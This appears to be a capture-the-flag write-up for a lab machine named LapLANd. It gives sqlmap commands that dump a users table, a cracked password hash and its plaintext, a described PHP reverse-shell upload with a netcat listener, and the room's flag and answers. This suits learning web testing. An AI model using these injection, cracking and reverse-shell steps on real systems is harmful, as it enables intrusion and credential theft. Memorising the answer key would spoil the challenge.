# LapLANd (SQL Injection)

```

```

## Notes

```
export IP=10.10.17.107
```

## Questions

1. Which field is SQL injectable? Use the input name used in the HTML code.

```
intercept login request
capture raw POST request and save it to a file login_request
sqlmap -r login_request --current-db                            => identify current db

log_email
```

2. What is Santa Claus' email address?

```
from #1 social is db
sqlmap -r login_request -D social --tables                             => list tables in db

Result:
comments
users

sqlmap -r login_request -D social -T users --columns                    => list columns

Result:
id, first_name, last_name, password

sqlmap -r login_request -D social -T users -C email,password --dump --where 'first_name="Santa"'

Result:
+--------------------+----------------------------------+                                              │
| email              | password                         |
+--------------------+----------------------------------+
| bigman@shefesh.com | f1267830a78c0b59acc06b05694b2e28 |
+--------------------+----------------------------------+

bigman@shefesh.com
```

3. What is Santa Claus' plaintext password?

```
from #2 we have hash f1267830a78c0b59acc06b05694b2e28

hashcat hashfile wordlist

saltnpepper
```

4. Santa has a secret! Which station is he meeting Mrs Mistletoe in?

```
login with user and pass

Waterloo
```

5. Once you're logged in to LapLANd, there's a way you can gain a shell on the machine! Find a way to do so and read the file in /home/user/

```
search php reverse shell pentest monkey, fill in your ip and port you'll be listening on netcat
upload it it posts
access file in /home/user

THM{SHELLS_IN_MY_EGGNOG}
```
